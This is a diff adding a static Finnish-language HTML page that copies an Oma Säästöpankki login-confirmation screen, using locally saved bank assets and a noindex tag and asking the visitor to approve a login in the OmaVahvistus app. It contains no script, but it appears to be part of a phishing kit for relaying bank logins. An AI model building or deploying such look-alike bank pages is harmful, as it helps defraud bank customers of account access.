@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="fi"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Vahvistus - Oma Säästöpankki</title>
+    <link href="./omasp_files/omasp_private.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+        .container-wrapper {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background: #000;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            height: auto;
+            margin: 0 auto 10px;
+            display: block;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        .content {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            text-align: center;
+        }
+        .icon-circle {
+            width: 120px;
+            height: 120px;
+            background: #e5f2ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        p {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            background: #000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-wrapper">
+        <header>
+            <div class="logo">
+                <img alt="Oma Säästöpankki" src="./omasp_files/logo_pieni.png" style="height: 46px; width: 120px">
+            </div>
+            <div style="font-size: 14px; margin-top: 10px;">Vahvistus</div>
+        </header>
+        <main>
+            <div class="content">
+                <div class="icon-circle">
+                    <svg viewBox="0 0 64 64" style="width: 64px; height: 64px;" fill="#000">
+                        <path d="M32,4C16.536,4,4,16.536,4,32s12.536,28,28,28s28-12.536,28-28S47.464,4,32,4z M32,56 C18.641,56,8,45.359,8,32S18.641,8,32,8s24,10.641,24,24S45.359,56,32,56z"></path>
+                        <path d="M28,32l6,6l12-12"></path>
+                    </svg>
+                </div>
+                <h1>Vahvista OmaVahvistus -sovelluksessa</h1>
+                <p>Avaa OmaVahvistus -sovellus</p>
+                <p style="font-size: 14px;">Vahvista kirjautuminen OmaVahvistus -sovelluksessa</p>
+                <button type="button" class="button" id="confirm-button">Vahvista</button>
+            </div>
+        </main>
+    </div>
+</body>
+</html>
+
+
+
